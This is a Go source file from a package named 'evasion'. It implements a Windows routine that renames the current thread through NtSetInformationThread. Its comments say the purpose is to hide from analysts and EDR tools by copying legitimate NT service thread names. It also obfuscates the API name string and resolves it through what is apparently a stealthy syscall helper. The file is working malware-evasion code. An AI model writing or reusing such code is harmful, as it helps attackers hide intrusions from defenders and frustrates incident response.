//go:build windows
// +build windows

package evasion

// spoofThreadName sets the current OS thread's name via
// NtSetInformationThread(ThreadNameInformation=0x26).
//
// When an analyst or EDR lists threads in Process Hacker, WinDbg, or via
// NtQueryInformationThread, the name appears instead of a bare TID.  An
// unnamed thread is a weak IOC; "WorkerThread" matches names used by
// legitimate NT service threads and removes that signal.
//
// ThreadNameInformation (0x26) was added in Windows 10 1607; silently
// ignored on older systems.

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// spoofThreadName sets the calling goroutine's OS thread name.
func spoofThreadName(name string) {
	nameW, err := windows.UTF16FromString(name)
	if err != nil || len(nameW) == 0 {
		return
	}
	ustr := winUnicodeString{
		Length: uint16((len(nameW) - 1) * 2),
		MaxLen: uint16(len(nameW) * 2),
		Buffer: uintptr(unsafe.Pointer(&nameW[0])),
	}
	p := NewHGProc(stackStr(
		'N', 't', 'S', 'e', 't', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n',
		'T', 'h', 'r', 'e', 'a', 'd',
	))
	if p == nil {
		return
	}
	const threadNameInformation = 0x26
	p.Call(
		^uintptr(1), // NtCurrentThread = (HANDLE)-2
		threadNameInformation,
		uintptr(unsafe.Pointer(&ustr)),
		uintptr(unsafe.Sizeof(ustr)),
	)
}
